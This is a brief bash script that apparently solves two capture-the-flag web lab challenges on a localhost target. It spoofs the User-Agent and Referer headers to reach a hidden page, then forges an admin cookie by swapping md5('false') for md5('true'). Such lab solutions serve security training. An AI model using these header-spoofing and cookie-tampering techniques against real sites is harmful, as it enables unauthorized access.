#!/bin/bash
curl -A "ft_bornToSec" --referer "https://www.nsa.gov/" "http://localhost:10080/?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c" -c cook.txt -v | grep flag

# < Set-Cookie: I_am_admin=68934a3e9455fa72420237eb05902327; expires=Sun, 15-Apr-2018 22:15:51 GMT
# md5 68934a3e9455fa72420237eb05902327:false
# md5 b326b5062b2f0e69046810717534cb09:true

curl "http://localhost:10080" --cookie "I_am_admin=b326b5062b2f0e69046810717534cb09" -v | grep -i flag
